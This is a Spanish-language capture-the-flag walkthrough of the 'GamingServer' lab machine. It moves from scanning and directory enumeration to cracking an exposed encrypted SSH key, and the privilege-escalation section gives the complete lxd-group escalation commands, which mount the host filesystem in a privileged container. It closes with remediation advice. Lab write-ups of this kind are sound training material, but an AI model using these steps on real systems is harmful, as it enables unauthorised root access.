# GamingServer
## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
```
## Enum
### HTTP
En la main page tenemos el siguiente comentario
```
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```
De ahi lo mismo podemos sacar un usuario, john
#### Gobusting
```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/robots.txt (Status: 200)
/secret (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
```
#### Secret
En secret encontramos un archivo con una key RSA encriptada
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
.
.
.
-----END RSA PRIVATE KEY-----
```
## Exploit
Crackeamos la key con ssh2john y con ella accedemos como el usuario john.

## Privesc
Vemos que el usuario pertenece al grupo lxd
```
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
Sabiendo esto, tenemos un vector de escalada de privilegios bien conocido
```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```
Abrimos un sevidor en local y nos traemos con wget el tar.gz que genera build-alpine, una vez lo tenemos hacemos lo siguiente
```
lxc image import ./apline.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

# Analisís de la intrusión
## Sensible data exposure
Las clave privada de acceso del usaurio john es accesible para usuarios externos esto nos permitio descargarlas e intentar crackearla
## Weak password police
La contraseña para la clave pirvada de john es debil lo que nos permitio crackearla facilmente
## lxd
Existe un fallo de seguridad critico que permite a un usuario pertenciente al grupo lxd obtener una shell privilegiada en una copia identica del sistema bajo mnt permitiendo arbitrary file read 

# Soluciones
## lxd
EL parche actualmente recomendado es eliminar la pertenencia a lxd de los usuarios regulares
